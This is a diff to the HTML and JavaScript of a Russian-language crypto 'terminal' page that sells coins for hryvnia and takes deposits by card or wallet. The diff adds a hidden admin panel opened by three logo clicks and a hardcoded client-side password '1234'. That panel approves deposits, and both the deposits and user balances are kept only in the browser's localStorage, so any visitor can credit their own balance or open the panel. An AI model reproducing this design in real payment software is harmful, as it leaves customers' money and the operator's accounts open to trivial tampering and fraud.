@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Terminal — Ultimate Hub 2026</title>
+    <title>TON Terminal — Pro Hub</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
@@ -13,9 +13,14 @@
         .buy-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); transition: all 0.3s; }
         .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
         .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
+        
+        /* Исправление выпадающего списка */
+        select option { background: #17212b; color: white; }
+        
         #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
         .falling-item { position: absolute; top: -50px; animation: fall linear infinite; }
         @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
+        
         .garland { position: fixed; top: 0; left: 0; width: 100%; z-index: 100; display: flex; justify-content: space-around; pointer-events: none; }
         .bulb { width: 12px; height: 12px; border-radius: 50%; animation: blink 1s infinite alternate; margin-top: 5px; }
         @keyframes blink { from { opacity: 0.2; } to { opacity: 1; box-shadow: 0 0 15px currentColor; } }
@@ -33,8 +38,8 @@
     <div id="snow-bg"></div>
 
     <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
-        <div class="flex items-center gap-2">
-            <span class="text-lg font-extrabold italic">TON<span class="text-blue-500">TERMINAL</span></span>
+        <div class="flex items-center gap-2 cursor-pointer" onclick="handleLogoClick()">
+            <span class="text-lg font-extrabold italic" id="logo-text">TON<span class="text-blue-500">TERMINAL</span></span>
         </div>
         <div class="flex items-center gap-3">
             <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10">
@@ -47,56 +52,53 @@
 
     <main class="max-w-7xl mx-auto p-4 md:p-8 relative z-10">
         <div class="flex justify-center flex-wrap gap-2 mb-8">
-            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">📈 Курс</button>
-            <button onclick="showTab('convert')" id="btn-convert" class="nav-tab glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">🔄 Конвертер</button>
+            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">📈 Курс & Калькулятор</button>
             <button onclick="showTab('shop')" id="btn-shop" class="nav-tab glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">🛒 Магаз</button>
             <button onclick="showTab('lotto')" id="btn-lotto" class="nav-tab glass px-4 py-3 rounded-2xl text-[9px] font-black uppercase transition-all">🎁 Лото</button>
         </div>
 
-        <div id="view-main" class="block">
-            <div class="glass p-6 rounded-[2.5rem] min-h-[500px]">
-                <div id="tradingview_widget" class="h-[450px] w-full rounded-2xl overflow-hidden"></div>
+        <div id="view-main" class="block space-y-6">
+            <div class="glass p-6 rounded-[2.5rem]">
+                <div id="tradingview_widget" class="h-[400px] w-full rounded-2xl overflow-hidden"></div>
             </div>
-        </div>
 
-        <div id="view-convert" class="hidden">
-            <div class="max-w-3xl mx-auto glass p-8 rounded-[3rem]">
-                <h3 class="text-2xl font-black uppercase mb-8 text-center">Глобальный <span class="text-blue-500">Конвертер</span></h3>
-                <div class="input-box p-6 rounded-2xl mb-8">
-                    <label class="text-[10px] text-slate-500 uppercase font-black block mb-2">Введите сумму в USD ($)</label>
-                    <input type="number" id="conv-usd" value="500" class="bg-transparent text-4xl font-bold outline-none w-full text-blue-400" oninput="runGlobalConvert()">
+            <div class="glass p-8 rounded-[2.5rem]">
+                <h3 class="text-xl font-black uppercase mb-6 text-center italic">Мгновенный <span class="text-blue-500">Конвертер USD</span></h3>
+                <div class="max-w-md mx-auto mb-8">
+                    <div class="input-box p-4 rounded-xl flex items-center">
+                        <span class="text-2xl mr-3 opacity-50">$</span>
+                        <input type="number" id="conv-usd" value="500" class="bg-transparent text-3xl font-bold outline-none w-full text-blue-400" oninput="runGlobalConvert()">
+                    </div>
                 </div>
-                <div id="conv-results" class="grid grid-cols-2 md:grid-cols-3 gap-4"></div>
+                <div id="conv-results" class="grid grid-cols-2 md:grid-cols-4 gap-4"></div>
             </div>
         </div>
 
         <div id="view-shop" class="hidden">
             <div class="max-w-2xl mx-auto glass p-8 rounded-[3rem]">
                 <h3 class="text-2xl font-black uppercase mb-8 text-center italic">Купить <span class="text-blue-500">Крипту</span></h3>
-                <div class="space-y-4 text-white">
-                    <select id="shop-coin-select" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl text-sm font-bold outline-none" onchange="updateShopRate()">
-                        <option value="TON">TON (Toncoin)</option>
-                        <option value="BTC">BTC (Bitcoin)</option>
-                        <option value="ETH">ETH (Ethereum)</option>
-                        <option value="SOL">SOL (Solana)</option>
-                        <option value="DOGE">DOGE (Dogecoin)</option>
-                        <option value="XRP">XRP (Ripple)</option>
-                        <option value="TRX">TRX (TRON)</option>
-                        <option value="LTC">LTC (Litecoin)</option>
-                        <option value="ADA">ADA (Cardano)</option>
-                        <option value="AVAX">AVAX (Avalanche)</option>
-                        <option value="DOT">DOT (Polkadot)</option>
-                        <option value="MATIC">MATIC (Polygon)</option>
-                    </select>
+                <div class="space-y-4">
+                    <div class="space-y-1">
+                        <label class="text-[9px] text-slate-500 uppercase font-black ml-2">Выберите монету</label>
+                        <select id="shop-coin-select" class="w-full bg-[#17212b] border border-white/10 p-4 rounded-xl text-sm font-bold outline-none text-white appearance-none cursor-pointer" onchange="updateShopRate()">
+                            <option value="TON">TON (Toncoin)</option>
+                            <option value="BTC">BTC (Bitcoin)</option>
+                            <option value="ETH">ETH (Ethereum)</option>
+                            <option value="SOL">SOL (Solana)</option>
+                            <option value="DOGE">DOGE (Dogecoin)</option>
+                            <option value="XRP">XRP (Ripple)</option>
+                            <option value="TRX">TRX (TRON)</option>
+                        </select>
+                    </div>
                     <div class="input-box p-5 rounded-2xl">
-                        <label class="text-[9px] text-slate-500 uppercase font-black block">Количество монет</label>
+                        <label class="text-[9px] text-slate-500 uppercase font-black block">Количество</label>
                         <input type="number" id="shop-qty" value="1" class="bg-transparent text-2xl font-bold outline-none w-full" oninput="updateShopRate()">
                     </div>
                     <div class="input-box p-5 rounded-2xl">
-                        <label class="text-[9px] text-blue-500 uppercase font-black block">Твой адрес кошелька</label>
-                        <input type="text" id="shop-wallet" placeholder="Введите адрес..." class="bg-transparent text-xs font-mono outline-none w-full">
+                        <label class="text-[9px] text-blue-500 uppercase font-black block">Ваш адрес кошелька</label>
+                        <input type="text" id="shop-wallet" placeholder="UQ..." class="bg-transparent text-xs font-mono outline-none w-full text-blue-300">
                     </div>
-                    <div class="text-center p-4 bg-white/5 rounded-xl">
+                    <div class="text-center p-4 bg-white/5 rounded-xl border border-white/5">
                         <div id="shop-total" class="text-3xl font-black text-green-400">0.00 грн</div>
                         <p class="text-[8px] text-slate-500 uppercase mt-1 italic">Комиссия 7.5%</p>
                     </div>
@@ -115,6 +117,16 @@
         </div>
     </main>
 
+    <div id="admin-panel" class="fixed inset-0 bg-black/98 z-[500] hidden flex-col items-center justify-center p-6">
+        <div class="glass p-8 rounded-[3rem] w-full max-w-lg">
+            <h3 class="text-2xl font-black uppercase mb-6 text-center text-red-500">Управление Заявками</h3>
+            <div id="pending-list" class="space-y-4 max-h-[400px] overflow-y-auto mb-6 pr-2">
+                <p class="text-center text-slate-500 text-sm italic">Заявок пока нет...</p>
+            </div>
+            <button onclick="closeModal('admin-panel')" class="w-full text-slate-500 font-bold uppercase text-xs">Закрыть</button>
+        </div>
+    </div>
+
     <div id="deposit-modal" class="fixed inset-0 bg-black/95 z-[200] hidden items-center justify-center p-4">
         <div class="glass p-8 rounded-[3rem] max-w-sm w-full text-center">
             <h3 class="text-xl font-black uppercase mb-6 text-blue-500">Пополнение</h3>
@@ -123,7 +135,7 @@
                 <button onclick="showDetails('Card')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all text-white">Карта</button>
                 <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all text-white">Кошелек</button>
             </div>
-            <div id="pay-details" class="hidden bg-blue-500/10 p-4 rounded-2xl mb-6 text-left">
+            <div id="pay-details" class="hidden bg-blue-500/10 p-4 rounded-2xl mb-6 text-left border border-blue-500/20">
                 <p id="details-val" class="text-[10px] font-mono break-all bg-black/40 p-2 rounded select-all text-white"></p>
             </div>
             <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-[10px] uppercase text-white">Я оплатил</button>
@@ -140,12 +152,55 @@
         
         let balance = parseFloat(localStorage.getItem('user_balance')) || 0;
         let rates = {};
+        let clickCount = 0;
+        let pendingDeposits = JSON.parse(localStorage.getItem('pending_deposits')) || [];
+
+        // Секретный вход в админку (3 клика по лого)
+        function handleLogoClick() {
+            clickCount++;
+            if (clickCount >= 3) {
+                const pass = prompt("Пароль админа:");
+                if (pass === "1234") {
+                    renderAdminPanel();
+                    openModal('admin-panel');
+                }
+                clickCount = 0;
+            }
+            setTimeout(() => { clickCount = 0; }, 2000);
+        }
+
+        function renderAdminPanel() {
+            const list = document.getElementById('pending-list');
+            if (pendingDeposits.length === 0) {
+                list.innerHTML = '<p class="text-center text-slate-500 text-sm italic">Заявок пока нет...</p>';
+                return;
+            }
+            list.innerHTML = pendingDeposits.map((dep, index) => `
+                <div class="bg-white/5 p-4 rounded-2xl border border-white/10 flex justify-between items-center">
+                    <div>
+                        <p class="text-[10px] text-slate-400 font-bold uppercase">${dep.method}</p>
+                        <p class="text-lg font-black text-green-400">${dep.amount} грн</p>
+                    </div>
+                    <button onclick="approveDeposit(${index})" class="bg-green-600 px-4 py-2 rounded-xl font-black text-[10px] uppercase">Подтвердить</button>
+                </div>
+            `).join('');
+        }
+
+        function approveDeposit(index) {
+            const dep = pendingDeposits[index];
+            balance += parseFloat(dep.amount);
+            pendingDeposits.splice(index, 1);
+            localStorage.setItem('pending_deposits', JSON.stringify(pendingDeposits));
+            updateUI();
+            renderAdminPanel();
+            alert("Баланс пополнен!");
+        }
 
         async function fetchAllRates() {
             try {
                 const res = await fetch('https://api.binance.com/api/v3/ticker/price');
                 const data = await res.json();
-                const symbols = ['TONUSDT', 'BTCUSDT', 'ETHUSDT', 'SOLUSDT', 'DOGEUSDT', 'XRPUSDT', 'TRXUSDT', 'LTCUSDT', 'ADAUSDT', 'AVAXUSDT', 'DOTUSDT', 'MATICUSDT', 'NEARUSDT', 'LINKUSDT'];
+                const symbols = ['TONUSDT', 'BTCUSDT', 'ETHUSDT', 'SOLUSDT', 'DOGEUSDT', 'XRPUSDT', 'TRXUSDT'];
                 data.forEach(item => {
                     if(symbols.includes(item.symbol)) rates[item.symbol.replace('USDT', '')] = parseFloat(item.price);
                 });
@@ -161,7 +216,7 @@
             container.innerHTML = "";
             Object.keys(rates).forEach(coin => {
                 const amount = usd / rates[coin];
-                container.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl border border-white/5"><p class="text-[8px] uppercase text-slate-500 font-bold mb-1">${coin}</p><p class="text-sm font-black text-blue-400">${amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</p></div>`;
+                container.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center"><p class="text-[8px] uppercase text-slate-500 font-bold mb-1">${coin}</p><p class="text-sm font-black text-blue-400">${amount.toLocaleString(undefined, {maximumFractionDigits: 5})}</p></div>`;
             });
         }
 
@@ -189,9 +244,14 @@
 
         function confirmDeposit() {
             const amt = document.getElementById('dep-input').value;
-            sendToAdmin(`💰 НОВЫЙ ДЕПОЗИТ!\nСумма: ${amt} грн\nПроверь оплату и подтверди в боте!`);
+            const method = document.getElementById('pay-details').classList.contains('hidden') ? "Unknown" : "Manual";
+            
+            pendingDeposits.push({ amount: amt, method: "Deposit Request" });
+            localStorage.setItem('pending_deposits', JSON.stringify(pendingDeposits));
+            
+            sendToAdmin(`💰 НОВЫЙ ДЕПОЗИТ!\nСумма: ${amt} грн\nЗайди на сайт и подтверди через логотип!`);
             closeModal('deposit-modal');
-            alert("Запрос отправлен! Ожидайте подтверждения.");
+            alert("Запрос отправлен! Админ подтвердит оплату.");
         }
 
         function processFinalPurchase() {
@@ -200,7 +260,7 @@
             const wallet = document.getElementById('shop-wallet').value;
             const uahPrice = rates[coin] * 42.5 * 1.075 * qty;
             if (balance < uahPrice) return alert("Недостаточно грн!");
-            if (wallet.length < 5) return alert("Введите кошелек!");
+            if (wallet.length < 5) return alert("Введите адрес!");
             balance -= uahPrice; updateUI();
             sendToAdmin(`🛒 КУПИЛИ КРИПТУ!\nМонета: ${coin}\nКол-во: ${qty}\nАдрес: ${wallet}\nСписано: ${uahPrice.toFixed(2)} грн`);
             alert("Заявка принята!");
@@ -222,7 +282,7 @@
         }
 
         function showTab(tab) {
-            ['main', 'convert', 'shop', 'lotto'].forEach(t => {
+            ['main', 'shop', 'lotto'].forEach(t => {
                 document.getElementById('view-' + t).classList.toggle('hidden', t !== tab);
                 document.getElementById('btn-' + t).classList.toggle('active', t === tab);
             });
